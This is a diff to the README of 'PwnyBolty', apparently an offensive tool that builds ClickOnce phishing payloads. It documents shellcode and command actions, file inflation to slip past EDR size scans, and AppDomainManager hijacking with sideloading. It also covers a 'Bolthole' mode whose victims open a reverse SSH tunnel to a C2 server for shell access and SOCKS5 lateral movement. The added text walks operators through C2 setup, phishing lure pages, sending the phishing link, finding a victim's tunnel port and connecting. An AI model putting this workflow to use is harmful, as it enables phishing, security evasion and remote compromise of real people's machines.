@@ -43,6 +43,19 @@ flowchart TB
 
 ## Mode 1 — CFCO (ClickForClickOnce)
 
+### UI Overview
+
+![ClickForClickOnce build form](docs/1_PwnyBolty_ClickForClickOnce.png)
+
+Fill in the four sections from top to bottom, then click **Build ClickOnce Payload**:
+
+| Section | What to configure |
+|---------|------------------|
+| **1 Application Identity** | Application name, publisher name, optional description, optional `.ico` icon |
+| **2 Payload Configuration** | Sideload target binary; inflate size (0–500 MB) to push past EDR size-scan thresholds |
+| **3 Actions** | One or more actions (Run Shellcode / OS Command / File Drop) executed on the target |
+| **4 Build** | Phishing page template; click **Build ClickOnce Payload** to kick off the background build |
+
 ### What happens on the server (build phase)
 
 The operator submits a build request. The API returns a `buildid` immediately and compiles the payload in the background.
@@ -105,9 +118,21 @@ sequenceDiagram
 
 Bolthole bundles a miniature SSH daemon (`sshd`) and SSH client (`ssh`) inside the ClickOnce package. Once the target runs the payload, it calls home through common firewall-allowed ports (443, 80, 22 …) and establishes a reverse tunnel back to your C2 server. The operator then SSHes into the tunnel and gets a shell — plus an optional SOCKS5 proxy for lateral movement.
 
-### Step 1 — Configure C2 (one-time setup)
+### C2 Configuration
+
+![Bolthole C2 Configuration](docs/2_PwnyBolty_BoltHole_C2_Config_1.png)
 
 Before building, save your C2 details so PwnyBolty can generate and store the global outbound keypair. This keypair is reused across all Bolthole builds so your C2 only needs one `authorized_keys` entry.
+
+| Field | Example | Notes |
+|-------|---------|-------|
+| **C2 Host** | `remote.server.com` | FQDN or IP of your C2 VPS |
+| **SSH Username** | `tunneluser` | Restricted user created by `c2_setup.sh` |
+| **Port Probe Order** | `443,80,22,31337` | Ports tried in order; first that connects wins |
+| **Tunnel Port Range** | `31332-31345` | Each victim gets a unique port in this range |
+| **SOCKS5 Port** | `1082` | SOCKS5 proxy port bound on C2 |
+
+Once saved, the **Global Outbound Keypair** is generated and displayed. Download `c2_setup.sh` and run it once on your C2 server to create the restricted SSH user and configure `authorized_keys`. Use **Rotate Keypair** to cycle to a new keypair if the key is ever compromised (requires re-running `c2_setup.sh`).
 
 ```mermaid
 sequenceDiagram
@@ -124,7 +149,19 @@ sequenceDiagram
     Note over C2: Creates a restricted SSH user (no login shell)<br/>Adds outbound public key to authorized_keys<br/>Enables TCP forwarding and GatewayPorts in sshd_config<br/>Opens required firewall ports (443, 80, 22, ...)
 ```
 
-### Step 2 — Build the payload
+### Payload Build
+
+![Bolthole Payload Build](docs/3_PwnyBolty_BoltHole_Payload_Build_2.png)
+
+After saving C2 config, click **Next: Build Payload →** to reach the build form. Configure the following, then click **Build Bolthole Payload**:
+
+| Section | What to configure |
+|---------|------------------|
+| **1 Application Identity** | App name, version, publisher name, provider URL (base hosting URL) |
+| **2 Payload Configuration** | Sideload target; **Files Prefix** (default `bolt` → `boltd.exe`, `boltcon.exe`…); inflate size; startup delay (s); reconnect delay (s) |
+| **3 Phishing Page Template** | HTML lure page included as `index.html` in the zip |
+| **4 Operator Public Keys** | Optional: paste additional operator public keys to embed in `authorized_keys` |
+| **5 Build** | Click **Build Bolthole Payload** to start the background build |
 
 ```mermaid
 sequenceDiagram
@@ -141,6 +178,38 @@ sequenceDiagram
 
     Builder-->>Operator: payload.zip · operator_key · c2_setup.sh
 ```
+
+### Build Logs and Artifacts
+
+![Bolthole Build Log](docs/4_PwnyBolty_BoltHole_Build_Logs.png)
+
+Click the **Log** button on any build in History (or wait for the modal to appear after clicking **Build Bolthole Payload**) to see the real-time build log. When the build finishes, the modal shows:
+
+**Download buttons:**
+
+| Artifact | Description |
+|----------|-------------|
+| `<name>.zip` | Full ClickOnce package — host this on your server and send the phishing link |
+| `operator_key` | Per-build ECDSA private key — keep this; it's the only copy |
+| `c2_setup.sh` | Script to configure your C2 server (only needed once per C2 host) |
+| **Browse Build Dir** | Opens the raw build directory listing for all files |
+
+**Post-build operator steps (shown in the modal):**
+
+1. **Identify the target's tunnel port** — grep the C2 SSH auth log for the `Invalid user` entry that encodes `<winuser>.<machine>.p<PORT>`:
+   ```bash
+   journalctl -u ssh -n 100 | grep -oP 'Invalid user \K\S+\.\S+\.p\d+(?= from)'
+   # older systems:
+   grep -oP 'Invalid user \K\S+\.\S+\.p\d+(?= from)' /var/log/auth.log
+   ```
+2. **Connect via the reverse tunnel** — copy the SSH command printed by step 1:
+   ```bash
+   ssh <win-user>@localhost -p <PORT> -i operator_key
+   ```
+
+**Build History** — the History panel lists all past builds with their timestamp, name, build ID, status, log, and download links:
+
+![Build History](docs/6_PwnyBolty_Build_History.png)
 
 **BoltFiles** — binaries embedded in the ClickOnce package and extracted to a temp directory on the target:
 
@@ -219,6 +288,39 @@ flowchart TB
 | ② | Operator SSHes into the C2 on the dynamically assigned tunnel port to get a shell |
 | ③ | The C2 forwards the connection through the reverse tunnel to the victim's local `sshd` |
 | ④ | Operator opens a SOCKS5 proxy through the same tunnel for lateral movement into the target network |
+
+---
+
+## Mode 3 — Custom Build
+
+![Custom Build form](docs/5_PwnyBolty_Custom_Build.png)
+
+The **Custom** tab lets you bring your own `AppDomainManager` C# source. PwnyBolty compiles it and wraps it in the same ClickOnce delivery package — AppDomainManager hijack, sideload EXE, phishing page, and zip — without touching your source code.
+
+| Section | What to configure |
+|---------|------------------|
+| **1 Application Identity** | App name, version, publisher name, provider URL |
+| **2 Program.cs** | Upload a `.cs` file or paste source directly into the editor. The class must inherit from `AppDomainManager` and override `InitializeNewDomain`. |
+| **3 Payload Configuration** | Sideload target; inflate size; optional custom `.ico` icon |
+| **4 Phishing Page Template** | HTML lure page template |
+
+**Minimal `Program.cs` skeleton:**
+```csharp
+using System;
+
+namespace MyPayload
+{
+    public class MyAppDomainManager : AppDomainManager
+    {
+        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+        {
+            // your code here
+        }
+    }
+}
+```
+
+Click **Build Custom Payload** to compile and package. The resulting zip is downloaded from the same History panel as all other builds.
 
 ---
 
